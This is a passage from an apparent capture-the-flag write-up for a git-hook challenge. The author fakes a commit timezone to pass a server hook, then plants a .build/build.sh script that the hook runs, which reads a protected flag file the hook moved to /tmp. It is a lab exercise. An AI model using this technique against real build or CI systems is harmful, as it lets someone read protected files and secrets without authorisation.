So now the timezone isn't good enough. We need to have a commit with the timezone of Baker Island, which is GMT-12:00. Fortunately, we can easily fake that:
```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# echo c > dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-2/ctf-repo# git add dummy.txt

```
We can see the hook moving the flag to the temporary folder:
```
remote: '/flag.txt' -> '/tmp/tmp.phLMEtUoUd/flag.txt'
remote: changed ownership of '/tmp/tmp.phLMEtUoUd/flag.txt' from flagger_the_second:flagger_the_second to build_system:build_system
```
Also, finally, we get to run some code. The hook wants to run `.build/build.sh`, so we'll give it just that:
```bash
#!/bin/bash
cat $(find /tmp -name "flag.txt" 2>/dev/null)
```
We push:
```console
